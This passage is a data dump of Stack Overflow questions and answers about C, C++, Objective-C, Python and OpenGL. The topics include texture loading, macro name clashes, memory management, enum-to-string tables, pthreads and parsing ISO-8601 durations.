    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);

    // free data (it's now been copied onto the GPU) and return texture handle
    free(rgbImage);
    return texture;
}
</code></pre>

<p>To render:</p>

<pre><code>glBindTexture(GL_TEXTURE_2D, texture);

glBegin(GL_QUADS);
    glTexCoord2f(0.0f, 0.0f); glVertex3f( 0.0f,  0.0f, 0.0f);
    glTexCoord2f(1.0f, 0.0f); glVertex3f(64.0f,  0.0f, 0.0f);
    glTexCoord2f(1.0f, 1.0f); glVertex3f(64.0f, 64.0f, 0.0f);
    glTexCoord2f(0.0f, 1.0f); glVertex3f( 0.0f, 64.0f, 0.0f);
glEnd();
</code></pre>

<p>And don't forget to call <code>glEnable(GL_TEXTURE_2D)</code> at some point during initialization, and call <code>glDeleteTextures(1, &amp;texture)</code> during shutdown.</p>
"
"<p>Hard to come up with a proper title for this problem. Anyway...</p>

<p>I'm currently working on a <a href=""http://en.wikipedia.org/wiki/GUI"" rel=""nofollow"">GUI</a> for my games in <a href=""http://www.libsdl.org"" rel=""nofollow"">SDL</a>. I've finished the software drawing and was on my way to start on the OpenGL part of it when a weird error came up. I included the ""SDL/SDL_opengl.h"" header and compile. It throws ""error C2039: 'DrawTextW' : is not a member of 'GameLib::FontHandler'"", which is a simple enough error, but I don't have anything called DrawTextW, only FontHandler::DrawText. I search for DrawTextW and find it in a #define call in the header ""WinUser.h""!</p>

<pre><code>//WinUser.h
#define DrawText DrawTextW
</code></pre>

<p><strong>Apparently it replaces my DrawText with DrawTextW! How can I stop it from spilling over into my code like that?</strong></p>

<p>It's a minor thing changing my own function's name, but naming conflicts like this seem pretty dangerous and I would really like to know how to avoid them all together.</p>

<p>Cheers!</p>
","9530","","<p>It's an unfortunate side effect of <code>#include</code>ing <code>&lt;windows.h&gt;</code>.  Assuming you're not actually using Windows' <code>DrawText()</code> anywhere in your program, it's perfectly safe to <code>#undef</code> it immediately after:</p>

<pre><code>// wherever you #include &lt;windows.h&gt;, or any other windows header
#include &lt;windows.h&gt;
#undef DrawText
</code></pre>
"
"<p>Ok,  I know this is a very basic question,  but my head is swimming in NSString vs C string
nonsense.</p>

<p>Basically I have a <code>NSString</code> the just contain 1 character  for example the letter D</p>

<p>How do I take that 1 character  <code>NSString</code> and assign it to a variable of char</p>

<p>So I have...</p>

<pre><code>char mychar;
NSString *myMode = [[NSString alloc] initWithFormat:@""%@"",[array objectAtIndex:0]];
//myMode ends up hold the letter D.   How do I get it into mychar??
</code></pre>

<p>Thanks for any help.</p>
","9530","","<p>Use <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSString%5FClass/Reference/NSString.html#//apple%5Fref/occ/instm/NSString/characterAtIndex:"" rel=""nofollow""><code>characterAtIndex:</code></a>.  However, this returns a Unicode character (<code>unichar</code>).  If you know that the character is definitely ASCII, you can safely cast it to a <code>char</code>:</p>

<pre><code>char theChar = (char)[myString characterAtIndex:0];
</code></pre>
"
"<p>What I can think of is:</p>

<p>Algo:</p>

<ol>
<li>Have a hash table which will store the number and its associated count</li>
<li>Parse the array and increment the count for number.</li>
<li>Now parse the hash table to get the number whose count is 1.</li>
</ol>

<p>Can you guys think of solution better than this.
With O(n) runtime and using no extra space</p>
","9530","","<p>I'm stealing <a href=""http://stackoverflow.com/questions/1089987/given-an-array-of-numbers-except-for-one-number-all-the-others-occur-twice-giv/1090013#1090013"">Michael Sofaer's answer</a> and reimplementing it in Python and C:</p>

<p>Python:</p>

<pre><code>def singleton(array):
    return reduce(lambda x,y:x^y, array)
</code></pre>

<p>C:</p>

<pre><code>int32_t singleton(int32_t *array, size_t length)
{
    int32_t result = 0;
    size_t i;
    for(i = 0; i &lt; length; i++)
        result ^= array[i];
    return result;
}
</code></pre>

<p>Of course, the C version is limited to 32-bit integers (which can trivially be changed to 64-bit integers if you so desire).  The Python version has no such limitation.</p>
"
"<p>Ok so I have a UIViewTable and a UISearchBar with two scope buttons. The idea being that when I press a scope button the datasource for UIViewTable gets changed but I am getting 
EXC_BAD_ACCESS error.</p>

<p>I have the following code in my UIViewController  SearchViewController.m:</p>

<pre><code>- (void)searchBar:(UISearchBar *)searchBar selectedScopeButtonIndexDidChange: (NSInteger) selected scope
{
    MyAppDelegate *delegate = (MyAppDelegate *) [[UIApplicationsharedApplication] delegate];
    if (self.listData != nil) {
        [self.listData release];
    }
    if (selectedScope == 0) {
        self.listData = [delegate.data getListOne];
    }
    else {
        self.listData = [delegate.data getListTwo];
    }
}

- (void) viewDidLoad {
    MyAppDelegate *delegate = (MyAppDelegate*) [[UIApplication sharedApplication] delegate];
    self.listData = [delegate.data getListOne];

    //some other unrelated code
}
</code></pre>

<p>in my SearchViewController.h I have:</p>

<pre><code>@property (nonatomic,retain) NSMutableArray *listData;
</code></pre>

<p>in my Data.m I have:</p>

<pre><code>-(NSMutableArray *) getListOne {
     NSMutableArray *list = [[NSMutableArray alloc] initWithObjects:@""test1"",
                                                                    @""test2"",
                                                                    nil];
     [list autorelease];
     return list;
}

-(NSMutableArray *) getListTwo {
     NSMutableArray *list = [[NSMutableArray alloc] initWithObjects:@""test3"",
                                                                    @""test4"",
                                                                    nil];
     [list autorelease];
     return list;
}
</code></pre>

<p>It crashes on:</p>

<pre><code>self.listData = [delegate.data getListTwo];
</code></pre>

<p>I checked that its when I am setting the property that it crashes. My understanding is that when I create the new NSMutableArray in Data.m I assign it autorelease as I should. </p>

<p>When the view loads I assign it to my listData and since I am accessing the property which has retain then the reference count is incremented (so its now 2 pending auto release).</p>

<p>When I press the button to change the data source I check too see if listData exists (which it always will), release it so that the old NSMutableArray counter will be 0 (assuming autorelease has occured). </p>

<p>Then I get a new NSMutableArray and set it to this property... is my understanding correct? I have spent far too long on this simple problem :(</p>

<p>oh also I did create another NSMutableArray that was not connected to the tableView and still get the same problem, also if I don't release it in my if statement the problem does not exist but I will then have a memory leak?? I could always just keep the array and remove/add objects but I want to know why this is not working :)
cheers</p>
","9530","","<p>This is your problem:</p>

<pre><code>if (self.listData !=nil)
{
    [self.listData release];
}
</code></pre>

<p>You don't need to do this check -- by virtue of the fact that you declared the <code>listData</code> property with the <code>retain</code> property, the synthesized setter automatically takes care of <code>release</code>ing the old value.  The synthesized setter would look something like this:</p>

<pre><code>- (void) setListData:(NSMutableArray *)listData
{
    [listData retain];
    [self-&gt;listData release];
    self-&gt;listData = listData;
}
</code></pre>

<p>Note a few things here: the old value is released, and the new value is retained.  Further, the retain happens <em>before</em> the release, in case of self-assignment: if you assign the same value, you don't want it to be prematurely deallocated.  Also note that if either the new or old value is <code>nil</code>, nothing bad happens, since Objective-C explicitly permits you to send messages to <code>nil</code>, having no effect.</p>

<p>So, this means that whenever you set the property, you don't need to worry about releasing the old value -- the setter does that for you.  Because you are doing an extra release, the object is getting deallocated before you're actually done using it, so as soon as you use it after it's been deallocated, you get the <code>EXC_BAD_ACCESS</code>.</p>
"
"<p>Assuming that I have a typedef declared in my .h file as such:</p>

<pre><code>typedef enum {
  JSON,
  XML,
  Atom,
  RSS
} FormatType;
</code></pre>

<p>I would like to build a function that converts the numeric value of the typedef to a string.  For example, if the message <code>[self toString:JSON]</code> was sent; it would return 'JSON'.</p>

<p>The function would look something like this:</p>

<pre><code>-(NSString *) toString:(FormatType)formatType {
  //need help here
  return [];
}
</code></pre>

<p>Incidentally, if I try this syntax </p>

<pre><code>[self toString:FormatType.JSON];
</code></pre>

<p>to pass the typedef value to the method, I get an error.  What am I missing?</p>

<p>Thanks,</p>

<p>Craig Buchanan</p>
","9530","","<p>You can't do it easily.  In C and Objective-C, enums are really just glorified integer constants.  You'll have to generate a table of names yourself (or with some preprocessor abuse).  For example:</p>

<pre><code>// In a header file
typedef enum FormatType : NSString {
    JSON,
    XML,
    Atom,
    RSS
} FormatType;

extern NSString * const FormatType_toString[];

// In a source file
// initialize arrays with explicit indices to make sure 
// the string match the enums properly
NSString * const FormatType_toString[] = {
    [JSON] = @""JSON"",
    [XML] = @""XML"",
    [Atom] = @""Atom"",
    [RSS] = @""RSS""
};
...
// To convert enum to string:
NSString *str = FormatType_toString[theEnumValue];
</code></pre>

<p>The danger of this approach is that if you ever change the enum, you have to remember to change the array of names.  You can solve this problem with some preprocessor abuse, but it's tricky and ugly.</p>
"
"<p>Example:</p>

<pre><code>&gt;&gt;&gt; try:
...    myapp.foo.doSomething()
... except Exception, e:
...    print 'Thrown from:', modname(e)

Thrown from: myapp.util.url
</code></pre>

<p>In the above example, the exception was actually thrown at myapp/util/url.py module. Is there a way to get the <code>__name__</code> of that module?</p>

<p>My intention is to use this in <code>logging.getLogger</code> function.</p>
","9530","","<p>You can use the <a href=""http://docs.python.org/library/traceback.html"" rel=""nofollow"">traceback module</a>, along with <a href=""http://docs.python.org/library/sys.html#sys.exc%5Finfo"" rel=""nofollow""><code>sys.exc_info()</code></a>, to get the traceback programmatically:</p>

<pre><code>try:
    myapp.foo.doSomething()
except Exception, e:
    exc_type, exc_value, exc_tb = sys.exc_info()
    filename, line_num, func_name, text = traceback.extract_tb(exc_tb)[-1]
    print 'Thrown from: %s' % filename
</code></pre>
"
"<p>When estimating tasks, how does one break from the grip of <a href=""http://en.wikipedia.org/wiki/Hofstadter%27s%5Flaw"">Hofstadter's law</a>?</p>
","9530","","<p>Hofstadter's Law is not meant to be taken seriously --- if it were true to the letter, every task would take an infinite amount of time if you took Hofstadter's Law into account.</p>
"
"<ul>
<li>(IBAction) changeProductText:(NSString *)str;{
lblProductTxt.text = str;
}</li>
</ul>

<p>I have that and i am trying to make it so that i can have the str and @""text"" but i don't know how to bind them together.</p>

<p>Any thoughts?</p>
","9530","","<p>Are you trying to append two strings?  Use <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSString%5FClass/Reference/NSString.html#//apple%5Fref/occ/instm/NSString/stringByAppendingString:"" rel=""nofollow""><code>stringByAppendingString:</code></a>:</p>

<pre><code>- (IBAction) changeProductText:(NSString *)str
{
    // set label text to str followed by ""text""
    lblProductTxt.text = [str stringByAppendingString:@""text""];
}
</code></pre>
"
"<p>I'm trying to do some classic C development in Visual C++ 2008 that will modify the characters of a string like so:</p>

<pre><code>void ModifyString(char *input)
{
  // Change first character to 'a'
  *input = 'a';
}
</code></pre>

<p>I'm getting a unhandled exception when I try to change a character.  It seems like I could do this in Visual Studio 6 or using gcc, but maybe I'm just forgetting something.  Does Visual Studio somehow pass char* by value (managing memory).  If so, how do I turn this off?</p>
","9530","","<p>You're probably passing a string literal somewhere:</p>

<pre><code>ModifyString(""oops"");  // ERROR!
</code></pre>

<p>C and C++ allow you to implicitly cast from string literals (which have type <code>const char[]</code>) to <code>char*</code>, but such usage is deprecated.  String constants are allowed to be allocated in read-only memory (and they usually are), so if you attempt to modify them, you'll get an access violation (aka segmentation fault or bus error).  If the compiler doesn't put string constants in read-only memory, the program will still work, but it is undefined behavior.</p>

<p>The correct way to do this is to copy the string into a writeable buffer:</p>

<pre><code>// one way:
char mystring[] = ""test"";
ModifyString(mystring);  // ok

// another way:
char mystring[64];  // make sure this is big enough!!
strcpy(mystring, ""test"");
ModifyString(mystring);  // ok
</code></pre>
"
"<p>Hi i am trying to create the affine transform that will allow me to transform a triangle into another one. What i have are the coordinates for the 2 triangles. Can you help me?</p>

<p>Following the answer by Adam Rosenfield i came up with this code in case anyone is bored to solve the equation himself :</p>

<pre><code>public static AffineTransform createTransform(ThreePointSystem source,
    		ThreePointSystem dest) {    	
    double x11 = source.point1.getX();
    double x12 = source.point1.getY();
    double x21 = source.point2.getX();
    double x22 = source.point2.getY();
    double x31 = source.point3.getX();
    double x32 = source.point3.getY();
    double y11 = dest.point1.getX();
    double y12 = dest.point1.getY();
    double y21 = dest.point2.getX();
    double y22 = dest.point2.getY();
    double y31 = dest.point3.getX();
    double y32 = dest.point3.getY();

    double a1 = ((y11-y21)*(x12-x32)-(y11-y31)*(x12-x22))/
                ((x11-x21)*(x12-x32)-(x11-x31)*(x12-x22));
    double a2 = ((y11-y21)*(x11-x31)-(y11-y31)*(x11-x21))/
                ((x12-x22)*(x11-x31)-(x12-x32)*(x11-x21));
    double a3 = y11-a1*x11-a2*x12;
    double a4 = ((y12-y22)*(x12-x32)-(y12-y32)*(x12-x22))/
                ((x11-x21)*(x12-x32)-(x11-x31)*(x12-x22));
    double a5 = ((y12-y22)*(x11-x31)-(y12-y32)*(x11-x21))/
                ((x12-x22)*(x11-x31)-(x12-x32)*(x11-x21));
    double a6 = y12-a4*x11-a5*x12;
    return new AffineTransform(a1, a4, a2, a5, a3, a6);
}
</code></pre>
","9530","","<p>I'm going to assume you're talking about 2D here.  An affine transformation matrix has 9 values in it:</p>

<pre>
    | a1 a2 a3 |
A = | a4 a5 a6 |
    | a7 a8 a9 |
</pre>

<p>There are 3 input vertices <code>x1</code>, <code>x2</code>, and <code>x3</code>, which when transformed should become <code>y1</code>, <code>y2</code>, <code>y3</code>.  However, since we're working in homogeneous coordinates, applying <code>A</code> to <code>x1</code> doesn't necessarily give <code>y1</code> -- it gives a multiple of <code>y1</code>.  So, we also have the unknown multipliers <code>k1</code>, <code>k2</code>, and <code>k3</code>, with the equations:</p>

<pre>
A*x1 = k1*y1
A*x2 = k2*y2
A*x3 = k3*y3
</pre>

<p>Each of those is a vector, so we really have 9 equations in 12 unknowns, so the solution is going to be underconstrained.  If we require that <code>a7=0</code>, <code>a8=0</code>, and <code>a9=1</code>, then the solution will be unique (this choice is natural, since it means if the input point is (<code>x</code>, <code>y</code>, 1), then the output point will always have homogeneous coordinate 1, so the resulting transform is just a 2x2 transform plus a translation).</p>

<p>Hence, this reduces the equations to:</p>

<pre>
a1*x11 + a2*x12 + a3 = k1*y11
a4*x11 + a5*x12 + a6 = k1*y12
                   1 = k1
a1*x21 + a2*x22 + a3 = k2*y21
a4*x21 + a5*x22 + a6 = k2*y22
                   1 = k2
a1*x31 + a2*x32 + a3 = k3*y31
a4*x31 + a5*x32 + a6 = k3*y32
                   1 = k3
</pre>

<p>So, <code>k1</code> = <code>k2</code> = <code>k3</code> = 1.  Plugging these in and converting to matrix form yields:</p>

<pre>
| x11 x12   1   0   0   0 |   | a1 |   | y11 |
| x21 x22   1   0   0   0 |   | a2 |   | y21 |
| x31 x32   1   0   0   0 | * | a3 | = | y31 |
|   0   0   0 x11 x12   1 |   | a4 |   | y12 |
|   0   0   0 x21 x22   1 |   | a5 |   | y22 |
|   0   0   0 x31 x32   1 |   | a6 |   | y32 |
</pre>

<p>Solving this 6x6 system of equations yields you your affine transformation matrix <code>A</code>.  It will have a unique solution if and only if the 3 points of your source triangle are not collinear.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/332111/how-do-i-convert-a-double-into-a-string-in-c"">How do I convert a double into a string in C++?</a>  </p>
</blockquote>



<p>I want to combine a string and a double and g++ is throwing this error:</p>

<p>main.cpp: In function ‘int main()’:<br />
main.cpp:40: error: invalid operands of types ‘const char [2]’ and ‘double’ to binary ‘operator+’</p>

<p>Here is the line of code which it is throwing the error on:</p>

<pre>
storedCorrect[count] = ""(""+c1+"",""+c2+"")"";
</pre>

<p>storedCorrect[] is a string array, and c1 and c2 are both doubles. Is there a way to convert c1 and c2 to strings to allow my program to compile correctly?</p>
","9530","","<p>You can't do it directly.  There are a number of ways to do it:</p>

<ol>
<li><p>Use a <a href=""http://en.cppreference.com/w/cpp/io/basic_stringstream""><code>std::stringstream</code></a>:</p>

<pre><code>std::ostringstream s;
s &lt;&lt; ""("" &lt;&lt; c1 &lt;&lt; "", "" &lt;&lt; c2 &lt;&lt; "")"";
storedCorrect[count] = s.str()
</code></pre></li>
<li><p>Use <a href=""http://www.boost.org/doc/libs/1_39_0/libs/conversion/lexical_cast.htm""><code>boost::lexical_cast</code></a>:</p>

<pre><code>storedCorrect[count] = ""("" + boost::lexical_cast&lt;std::string&gt;(c1) + "", "" + boost::lexical_cast&lt;std::string&gt;(c2) + "")"";
</code></pre></li>
<li><p>Use <a href=""http://en.cppreference.com/w/cpp/io/c/snprintf""><code>std::snprintf</code></a>:</p>

<pre><code>char buffer[256];  // make sure this is big enough!!!
snprintf(buffer, sizeof(buffer), ""(%g, %g)"", c1, c2);
storedCorrect[count] = buffer;
</code></pre></li>
</ol>

<p>There are a number of other ways, using various double-to-string conversion functions, but these are the main ways you'll see it done.</p>
"
"<p>I have a simple grep command that returns lines that match from a file.  Here's the problem:  Sometimes, when a line matches, I want to include the line before it.  What I want is a way to find all the lines that match a pattern, then use a different pattern to see if the line before each of those results match.</p>

<p>Let's say I want to get all lines containing 'bar', and the line before each of those only if they contain 'foo'.  Given an input like this:</p>

<pre>
    Spam spam eggs eggs
    Let's all go to the bar.
    Blah Blah Blah foo.
    Meh.
    foo foo foo
    Yippie, a bar.
</pre>

<p>I'd like a result like this:</p>

<pre>
    Let's all go to the bar
    foo foo foo
    Yippie, a bar.
</pre>
","9530","","<p>You can use the <code>-B</code> option to include context lines before the match (there's also <code>-A</code> for including context lines after, and <code>-C</code> for including context lines before and after).  You can then pipe the result into another <code>grep</code>:</p>

<pre><code># Get all lines matching 'bar' and include one line of context before each match
# Then, keep only lines matching 'bar' or 'foo'
grep bar -B1 the-file | grep 'bar\|foo'
</code></pre>
"
"<p>I have tried everything from SDL to DevIL, and they have all failed for various reasons.
<br/>
<br/>
SDL segfaults for various reasons, and DevIL is having some weird problem where even after i include IL/ilut.h and linking everything, and including the other headers, it is not defining the functions i need to load images into opengl textures (something about USE_OPEN_GL not being defined).  I am asking for any other lib out there for loading bitmaps or png's into a format i can easily convert to opengl, or a solution to the devil problem.
<br/>
<br/>
thanks</p>
","9530","","<p>Loading bitmaps (.bmp) and netpbm images (.pbm, pgm, .pnm) is fairly trivial, since they store images uncompressed.  For loading PNGs, use <a href=""http://www.libpng.org/pub/png/libpng.html"" rel=""nofollow"">libpng</a>.  For loading JPEGs, use <a href=""http://www.ijg.org/"" rel=""nofollow"">libjpeg</a>.  For other image types, use an appropriate library.  There's a good change that slapping on 'lib' to the beginning of the image name will give you such a library, e.g. libtiff, libtga, etc.</p>

<p>Once you've loaded and uncompressed the raw image data, loading it into an OpenGL texture is just a matter of calling <a href=""http://www.opengl.org/documentation/specs/man%5Fpages/hardcopy/GL/html/gl/teximage2d.html"" rel=""nofollow""><code>glTexImage2D()</code></a> with the right parameters, and a couple of other GL state changes (e.g. how to do mipmapping).</p>
"
"<p>I'd like to be able to declare an array as a function argument in C++, as shown in the example code below (which doesn't compile).  Is there any way to do this (other than declaring the array separately beforehand)?</p>

<pre><code>#include &lt;stdio.h&gt;

static void PrintArray(int arrayLen, const int * array)
{
   for (int i=0; i&lt;arrayLen; i++) printf(""%i -&gt; %i\n"", i, array[i]);
}

int main(int, char **)
{
   PrintArray(5, {5,6,7,8,9} );  // doesn't compile
   return 0;
}
</code></pre>
","9530","","<p>As others have mentioned, it will be allowed in C++0x.  However, it <em>is</em> currently allowed in C99:</p>

<pre><code>void PrintArray(size_t len, int *array)
{
    for(size_t i = 0; i &lt; len; i++)
        printf(""%d\n"", array[i]);
}

int main(int argc, char **argv)
{
    PrintArray(5, (int[]){1, 2, 3, 4, 5}); /* C99 only, not valid in C++ or ANSI C */
    return 0;
}
</code></pre>
"
"<p>I'm working on a hot-upgrade feature and need to package up an array of structs to be stashed away for the new version to find them. I really want to avoid adding a conversion function for every possible version transition. Is this reasonable?<br />
  The most likely change to the struct is for more fields to be added to the structure in the future and if this happens then a default value for the new field will be available. I will also soon face the task of saving the array of structs into a configuration file, so extra credit for answers that can be applied to both hot-upgrade and configuration saving.<br />
  I don't have to worry about the hot-update mechanism I just give it a pointer and a size and it does fantastic magic :)</p>
","9530","","<p>I'd recommend using something like Google's <a href=""http://code.google.com/p/protobuf/"" rel=""nofollow"">protocol buffers</a>, which automatically handle versioning.  If you add new fields to your messages, it's very easy to handle.</p>
"
"<p>I'm building a per-user file browsing/uploading application using Django and when I run this function</p>

<pre><code>
def walkdeep(request, path):
    path, dirs, files = walktoo('/home/damon/walktemp/%s' % path)
    return render_to_response('walk.html', {
        'path' : path[0],
        'dirs' : path[1],
        'files' : path[2],
    }, context_instance=RequestContext(request))

def walktoo(dir):
    for path, dirs, files in os.walk(dir):
        yield path, dirs, files
    print path, dirs, files
</code></pre>

<p>I get this error:</p>

<p><code>need more than 1 value to unpack</code></p>

<p>Also, i know this is a silly way to do this, any advice would be appreciated.</p>

<p>edit:</p>

<p>this was actually very silly on my part, i completely forgot about os.listdir(dir) which is a much more reasonable function for my purposes. if you use the selected answer, it clears up the above issue i was having, but not with the results i wanted.</p>
","9530","","<pre><code>path, dirs, files = walktoo('/home/damon/walktemp/%s' % path)
</code></pre>

<p>In this line, you're expecting <code>walktoo</code> to return a tuple of three values, which are then to be unpacked into <code>path</code>, <code>dirs</code>, and <code>files</code>.  However, your <code>walktoo</code> function is a generator object: calling <code>walktoo()</code> yields a single value, the generator.  You have to call <code>next()</code> on the generator (or call it implicitly by doing some sort of iteration on it) to get what you actually want, namely the 3-tuple that it yields.</p>

<p>I'm not entirely clear what you want to do -- your <code>walkdeep()</code> function is written like it only wants to use the first value returned by <code>walktoo()</code>.  Did you mean to do something like this?</p>

<pre><code>for path, dirs, files in walktoo(...):
    # do something
</code></pre>
"
"<p>I'm looking for an easy way to parse a string that contains an ISO-8601 <strong>duration</strong> in Objective C. The result should be something usable like a <code>NSTimeInterval</code>.</p>

<p>An example of an ISO-8601 duration: <code>P1DT13H24M17S</code>, which means 1 day, 13 hours, 24 minutes and 17 seconds.</p>
","9530","","<p>If you know exactly which fields you'll be getting, you can use one invocation of <code>sscanf()</code>:</p>

<pre><code>const char *stringToParse = ...;
int days, hours, minutes, seconds;
NSTimeInterval interval;
if(sscanf(stringToParse, ""P%dDT%dH%dM%sS"", &amp;days, &amp;hours, &amp;minutes, &amp;seconds) == 4)
    interval = ((days * 24 + hours) * 60 + minutes) * 60 + seconds;
else
    ; // handle error, parsing failed
</code></pre>

<p>If any of the fields might be omitted, you'll need to be a little smarter in your parsing, e.g.:</p>

<pre><code>const char *stringToParse = ...;
int days = 0, hours = 0, minutes = 0, seconds = 0;

const char *ptr = stringToParse;
while(*ptr)
{
    if(*ptr == 'P' || *ptr == 'T')
    {
        ptr++;
        continue;
    }

    int value, charsRead;
    char type;
    if(sscanf(ptr, ""%d%c%n"", &amp;value, &amp;type, &amp;charsRead) != 2)
        ;  // handle parse error
    if(type == 'D')
        days = value;
    else if(type == 'H')
        hours = value;
    else if(type == 'M')
        minutes = value;
    else if(type == 'S')
        seconds = value;
    else
        ;  // handle invalid type

    ptr += charsRead;
}

NSTimeInterval interval = ((days * 24 + hours) * 60 + minutes) * 60 + seconds;
</code></pre>
"
"<p>i have encountered these ""X_t"" types many times in c programs,what does they really mean?where is the location of these definition? </p>
","9530","","<p>The <code>_t</code> suffix means ""type""; it's not a rule that you have to use it, it's just a convention followed by a lot of standard types from the standard libraries.  They're usually defined in the header files that use them, or sometimes in header files included by those headers.</p>

<p><code>size_t</code> is defined in <code>&lt;stddef.h&gt;</code>, and <code>time_t</code> is defined in <code>&lt;time.h&gt;</code>.  <code>key_t</code> is not a standard C type, so it's probably defined in the library header for whatever library it's used in.</p>

<p>If you want to know <em>exactly</em> which header file a definition came from, you can run the preprocessor:</p>

<pre><code>gcc -E file.c -o file.i
</code></pre>

<p>The preprocessor output <code>file.i</code> will show you all of the nested include files.  You can then search it for the definition, then scroll upwards until you find the comment that indicates which header file it came from.</p>
"
"<p>Working with stl:list and stl::vector types under interrupt handlers I want to avoid malloc() calls.</p>

<p>The question: What is a best way to prevent malloc() calls in STL list and vector? Is it enough to create structure with predefined size and then avoid push/pop/erase calls?</p>

<p>Thank you in advance</p>
","9530","","<p>As <a href=""http://stackoverflow.com/questions/1149994/stdlist-stdvector-methods-and-malloc/1150124#1150124"">onebyone.livejournal.com mentioned</a>, the C++ standard does not say anything about <em>interrupt</em> handlers.  It does talk about <em>signal</em> handlers, but even then it's a very gray area.  About the only thing you can do inside a signal handler that's guaranteed to have well-defined behavior across all conforming C/C++ implementations is assigning to a variable of type <code>sig_atomic_t</code> and returning, e.g.:</p>

<pre><code>sig_atomic_t flag = 0;

// This signal handler has well-defined behavior
void my_signal_handler(int signum)
{
    flag = 1;
}

int main(void)
{
    signal(SIGINT, &amp;my_signal_handler);

    while(1)
    {
        doStuff();
        if(flag)
        {
            flag = 0;
            actuallyHandleSignalNow();
        }
    }

    return 0;
}
</code></pre>

<p>Although in practice, you can almost always get away with doing a little more inside your signal handler.</p>
"
"<p>I've been playing around with iPhone development for a while, and although it feels a bit awkward when you're a ""hard core"" .NET developer, it's not all that bad once you get used to it.</p>

<p>In every book I read about Objective-C, there's only talk about retain/release (reference counting) for memory management. As an old-skool C/C++ developer, it seems strange that allocating the ""normal"" way, using malloc() and free() is only mentioned in some footnotes.</p>

<p>I know that malloc() and free() work in Objective-C, but I'm curious if it is common practice or not. After all, if I want to allocate an array of 100 integers, it seems that this is the most efficient way to do it:</p>

<pre><code>int *array = malloc(sizeof(int) * 100);

memset(array,0,sizeof(int) * 100);

// use the array

free(array);
</code></pre>

<p>Is this indeed the best way, or should I avoid plain C memory management?</p>
","9530","","<p>It's perfectly fine -- Objective-C is a strict superset of C, so if you want to write plain C, there's nothing preventing you from doing so.  In many cases, it's advantageous to use <code>malloc</code> and <code>free</code> to avoid the overhead of the Objective-C runtime.</p>

<p>For example, if you need to dynamically allocate an array of an unknown number of integers, it's often simpler and easier:</p>

<pre><code>int *array = malloc(N * sizeof(int));  // check for NULL return value!
// use array[0]..array[N-1]
...
free(array);
</code></pre>

<p>Versus:</p>

<pre><code>NSMutableArray *array = [[NSMutableArray alloc] initWithCapacity:N];
// use NSMutableArray methods to do stuff with array; must use NSNumbers instead
// of plain ints, which adds more overhead
...
[array release];
</code></pre>

<p>I was working on a word game for the iPhone, and we had to load a multi-megabyte dictionary of valid words.  The word list was loaded into one giant <code>char</code> array allocated with <code>malloc()</code>, with some clever optimizations to reduce the memory size even more.  Obviously for something like this, the overhead of using an <code>NSArray</code> is completely impractical on the limited iPhone.  I don't know exactly what the overhead is, but it's certainly more than one byte per character.</p>
"
"<p>Lets say i have a class such as</p>

<pre><code>class c{...
    void *print(void *){ cout &lt;&lt; ""Hello""; }
}
</code></pre>

<p>And then i have a vector of c</p>

<pre><code>vector&lt;c&gt; classes; pthread_t t1;
classes.push_back(c());
classes.push_back(c());
</code></pre>

<p>Now i want to create a thread on <code>c.print();</code></p>

<p>And the Following is Giving me problem <code>pthread_create(&amp;t1, NULL, &amp;c[0].print, NULL);</code></p>

<pre><code>Error Ouput: cannot convert ‘void* (tree_item::*)(void*)’ to ‘void* (*)(void*)’ 
for argument ‘3’ to ‘int pthread_create(pthread_t*, const pthread_attr_t*,
void* (*)(void*), void*)’
</code></pre>
","9530","","<p>You can't do it the way you've written it because C++ class member functions have a hidden <code>this</code> parameter passed in.  <code>pthread_create()</code> has no idea what value of <code>this</code> to use, so if you try to get around the compiler by casting the method to a function pointer of the appropriate type, you'll get a segmetnation fault.  You have to use a static class method (which has no <code>this</code> parameter), or a plain ordinary function to bootstrap the class:</p>

<pre><code>class C
{
public:
    void *hello(void)
    {
        std::cout &lt;&lt; ""Hello, world!"" &lt;&lt; std::endl;
        return 0;
    }

    static void *hello_helper(void *context)
    {
        return ((C *)context)-&gt;hello();
    }
};
...
C c;
pthread_t t;
pthread_create(&amp;t, NULL, &amp;C::hello_helper, &amp;c);
</code></pre>
"
"<p>For very low level optimization purposes it would be useful to me if I could store a compiled function inside a variable directly, <em>not</em> a pointer to a function. That is, if I have a function foo, I want to make a char buffer large enough to hold the machine instructions generated for foo, and then be able to in effect call foo by somehow telling C to jump execution to the contents of that buffer (assume that I have a compiler intrinsic to make sure the char buffer is aligned properly for my architecture). Ideally, I'd like to do this keeping assembly usage to a minimum (I realize some might be required).</p>

<p>My best solution so far would be to compile a program that has just the function I want to assembly with GCC, then compile to machine code, then use the addresses from the outputted assembly to extract the desired machine code from the executable, then manually fill the buffer with that in my program, then use inline assembly to jump to the starting address of the buffer. That's more hackish and manual work than I would like though.</p>

<p>I don't need to compile new functions at runtime, just have the buffer contain instructions corresponding to different already compiled functions during runtime. E.g. I might have 3 compiled functions, and 1 buffer. The 3 functions are known at compile time, but at runtime the buffer may correspond to any one of the 3 at different times.</p>

<p>Edit: To clarify what there would be to gain: I have a struct of which this buffer will be a member, and various pointers to instances of that struct. Each struct's buffer may contain a different compiled function. If I were to use a function pointer instead of the buffer, I would have to load the struct's function pointer, then deref the function pointer. With the buffer, I can just jump the program counter to an offset (the buffer's relative location) of the base of the struct. It's one less level of indirection. For very tiny functions, this can be a savings.</p>

<p>Edit 2: Further clarifying:</p>

<p>With a function pointer:</p>

<ol>
<li>Load pointer from &amp;struct+offsetof(pointer)</li>
<li>Jump to location contained in pointer</li>
</ol>

<p>With a buffer that contains machine code:</p>

<ol>
<li>Jump to &amp;struct+offsetof(buffer)</li>
</ol>

<p>The second one is less steps.</p>
","9530","","<p>If you're going to be compiling and optimizing code at runtime, I'd recommend taking a look at <a href=""http://llvm.org/"" rel=""nofollow"">LLVM</a>.  <a href=""http://www.haible.de/bruno/packages-ffcall.html"" rel=""nofollow"">ffcall</a> is also a useful package.  Note that both of these take care of problems like making sure the memory allocated for the function is executable and that the instruction cache is flushed properly for a large variety of architectures.  You don't want to reinvent the wheel.</p>
"
"<p>In the question <a href=""http://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c"">Why should we typedef a struct so often in C?</a>, unwind answered that:</p>

<blockquote>
